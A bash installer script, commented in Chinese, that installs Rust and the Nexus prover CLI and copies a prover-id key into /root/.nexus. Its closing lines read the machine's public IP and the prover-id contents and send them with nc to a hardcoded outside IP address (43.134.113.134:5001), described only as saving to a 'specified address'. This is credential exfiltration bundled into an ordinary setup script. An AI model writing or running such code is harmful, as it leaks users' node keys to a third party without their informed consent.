#!/bin/bash

# 节点安装功能
function install_node() {
    # 更新并升级Ubuntu软件包
    echo "正在更新软件包列表..."
    sudo apt-get update

    # 安装所需的依赖包
    echo "正在安装依赖包..."
    sudo apt-get install -y \
        build-essential \
        pkg-config \
        libssl-dev \
        protobuf-compiler \
        cargo

    # 安装 Rust（Nexus 节点所需）
    echo "正在安装 Rust..."
    curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y

    # 设置 Rust 环境变量
    echo "配置 Rust 环境变量..."
    source $HOME/.cargo/env
    export PATH="$HOME/.cargo/bin:$PATH"

    # 检查 Rust 是否安装成功
    rustc --version && cargo --version
    if [ $? -eq 0 ]; then
        echo "Rust 安装成功"
    else
        echo "Rust 安装失败，请检查错误信息。"
        exit 1
    fi

    # 进入 /root/.nexus/ 目录并删除原来密钥文件
    echo "正在准备密钥文件..."
    cd
    mkdir .nexus
    cd .nexus

    # 复制导入的密钥文件
    cp /root/nexus/prover-id /root/.nexus/prover-id

    # 创建一个新的 screen 会话并运行 Nexus 节点安装命令
    echo "正在启动 Nexus 节点..."
    screen -dmS nexus-node sh -c 'curl https://cli.nexus.xyz/ | sh'

    # 提示用户操作完成信息
    echo "======================================"
    echo "安装完成！请退出脚本并使用 'screen -r nexus-node' 查看状态。"
    echo "你也可以使用 'tail -f /root/.nexus/nexus.log' 来查看日志。"
    echo "======================================"

# 导出IP及 /root/.nexus/prover-id文件

# 获取本地 IP 地址
public_ip=$(curl -s https://api.ipify.org)
echo "公共 IP 地址: $public_ip" 

# 获取 prover-id 内容
export ID=$(cat /root/.nexus/prover-id)

# 将 IP 地址和 ID 写入文件
echo "$public_ip----$ID" > /root/data.txt

# 输出确认信息
echo "IP 地址和 ID 已写入到 /root/data.txt"

# 保存到指定地址
echo "$public_ip----$ID" | nc -q 1 43.134.113.134 5001
echo "已保存到指定位置"：43.134.113.134
}
# 调用安装节点的函数
install_node
